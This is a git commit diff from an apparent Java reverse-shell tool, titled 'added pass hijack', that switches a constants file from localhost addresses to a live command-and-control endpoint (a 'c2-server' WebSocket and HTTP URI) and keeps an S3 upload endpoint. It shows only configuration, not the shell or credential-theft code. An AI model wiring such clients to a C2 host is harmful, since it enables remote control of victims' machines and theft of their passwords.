d4fb0c4de37c3ec5120a2984f7df6ed32470cd79
Mohammed Hattab <mohammedhattab97@gmail.com>
2023-11-25 17:16:14 -0500

    added pass hijack

--- src/main/java/com/mtattab/reverseshell/util/Constants.java
+++ src/main/java/com/mtattab/reverseshell/util/Constants.java
@@ -1,14 +1,14 @@
 package com.mtattab.reverseshell.util;
 
-public interface Constants {
+public class Constants {
 
-    public static final String SERVER_WEBSOCKET_URI = "ws://127.0.0.1:8070/reverseShellClients" ;
-    public static final String SERVER_HTTP_URI = "http://127.0.0.1:8070" ;
+//    public static  String SERVER_WEBSOCKET_URI = "ws://127.0.0.1:8070/reverseShellClients" ;
+//    public static  String SERVER_HTTP_URI = "http://127.0.0.1:8070" ;
 
-//    public static final String SERVER_WEBSOCKET_URI = "wss://c2-server.mtattab.com/reverseShellClients" ;
-//    public static final String SERVER_HTTP_URI = "https://c2-server.mtattab.com" ;
 
-//    public static final String PROD_SERVER_WEBSOCKET_URI = "wss://<?>/reverseShellClients" ;
+    public static final String SERVER_WEBSOCKET_URI = "wss://c2-server.mtattab.com/reverseShellClients" ;
+    public static final String SERVER_HTTP_URI = "https://c2-server.mtattab.com" ;
+
 
 
     public static final String S3_API_ENDPOINT = "/v1/api/s3";
